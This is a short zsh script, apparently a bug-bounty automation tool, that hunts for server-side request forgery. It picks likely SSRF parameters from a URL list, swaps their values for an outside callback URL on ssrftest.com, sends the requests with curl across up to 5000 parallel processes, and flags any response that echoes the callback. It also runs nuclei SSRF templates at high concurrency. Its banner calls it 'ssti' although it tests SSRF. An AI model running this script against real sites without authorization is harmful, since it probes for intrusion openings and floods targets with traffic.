#!/bin/zsh

#TARGET=$1

#------------------------------------------------#
echo -e "[+] Start gf ssti v1 [+]"
#------------------------------------------------#
cat parameters.txt | gf ssrf | sed "s/'/ /g" | sed "s/(/ /g" | sed "s/)/ /g" | qsreplace "FUZZ" | anew -q ssrfPatterns.txt
#------------------------------------------------#
cat ssrfPatterns.txt | qsreplace http://ssrftest.com/x/IqkgW | xargs -P 5000 -I % bash -c "curl -s -L '%' | grep http://ssrftest.com/x/IqkgW && echo -e \"[VULNERABLE] - % \n \"" 2> /dev/null | grep "VULNERABLE" | anew -q ssrf.txt &> /dev/null
#------------------------------------------------#
httpx -l ssrfPatterns.txt | grep "=" | qsreplace http://ssrftest.com/x/IqkgW
#------------------------------------------------#
nuclei -l parameters.txt -t ssrf.yaml -c 700 -rate-limit 1000
nuclei -l ssrfPatterns.txt -t ssrf.yaml -c 700 -rate-limit 1000
#------------------------------------------------#
rm ssrfPatterns.txt
